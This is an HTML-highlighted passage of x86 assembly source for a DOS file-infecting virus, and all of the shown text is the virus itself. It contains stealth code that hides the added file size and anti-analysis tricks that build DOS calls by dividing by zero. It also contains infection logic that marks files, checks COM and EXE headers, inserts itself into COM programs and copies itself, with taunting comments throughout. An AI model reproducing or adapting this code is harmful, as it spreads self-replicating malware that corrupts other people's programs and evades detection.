        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dont_stealth_w95</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">close_stealth</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">close_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">

                </span><span class="sc1">; The date is in EDX:EAX, in FILETIME format, that is,</span><span class="sc0">
                </span><span class="sc1">;in nanoseconds*100d, ( 1 nano = 10^(-9) )</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">dont_stealth_w95</span><span class="sc0">

                        </span><span class="sc1">; Substract virus size</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">dont_stealth_w95</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                             File infection</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   They say solution is seek and destroy. Ambition. You've gotta fight for</span><span class="sc0">
</span><span class="sc1">; their wealth, you've gotta compete against others,  you've  gotta  follow</span><span class="sc0">
</span><span class="sc1">; their dogmas; so, maybe one day they'll  get  you  to  their  Kingdom  of</span><span class="sc0">
</span><span class="sc1">; Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Have you wondered why their only desire is keeping you far away from the</span><span class="sc0">
</span><span class="sc1">; nonsense ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">attak_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end_found</span><span class="sc0">

</span><span class="sc5">front_door</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">outta_crypt</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3500h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int0h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int0h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0ad54h</span><span class="sc0">                </span><span class="sc1">; Base pointer :PPPP mwahaha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7354h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int0handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">                </span><span class="sc1">; 2500h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; 3524h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0acd0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">                   </span><span class="sc1">; 2524h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24handler</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5290h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int8h</span><span class="sc4">+</span><span class="sc2">2d</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int8h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">; 2508</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">@find_end</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; Search for end of file name ( 0 )</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@find_end</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int24handler</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; Why not here ? :-P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@end_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">; Later</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Likely_Com</span><span class="sc0">

</span><span class="sc5">@Likely_Exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">It_is_Xe</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_infection</span><span class="sc0">
</span><span class="sc5">It_is_Xe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">


</span><span class="sc5">@Likely_Com</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">09cd4h</span><span class="sc0">       </span><span class="sc1">; AX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a02ch</span><span class="sc0">           </span><span class="sc1">; 3d00h :-)</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_infection</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_infection</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Attribs 2 zero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Write/read mode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Infection mark.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">rest_attrs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;*Final_Check*</span><span class="sc0">

                    </span><span class="sc1">; 1eh</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffercom</span><span class="sc0">                </span><span class="sc1">; ah = 3fh ( read 01ch bytes )</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0de00h</span><span class="sc0">                   </span><span class="sc1">; 0fch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04300h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Is it an exe header ?</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Non_Exe_Phile</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">@Non_Exe_Phile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Infect_Exe</span><span class="sc0">
</span><span class="sc1">;*Final_Check_Ends*</span><span class="sc0">

                    </span><span class="sc1">; Inserting possibility</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">07f00h</span><span class="sc0"> </span><span class="sc1">; 32 Kb max for inserting</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@append</span><span class="sc0">                     </span><span class="sc1">; ( 32Kb - 100h bytes for Psp )</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EMS_IVT</span><span class="sc0">                     </span><span class="sc1">; Check if EMS vector 67h</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@append</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; EMS there ?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@append</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EMS_Get</span><span class="sc0">             </span><span class="sc1">; DS = SEGMENT, DX = HANDLE, BX = FHANDLE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

</span><span class="sc1">; Inserting infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Load file at ds:0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_es</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuck_the_rules</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Mode 02 ( checking for instruction</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;length )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">code_emulator</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">   </span><span class="sc1">; Para ajustar a la posici¢n anterior</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_pos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Return address</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Where to put the jmp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">      </span><span class="sc1">; innecesario ?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffercom</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = Place of inserting</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Smack_My_Bitch_UP</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_myself</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
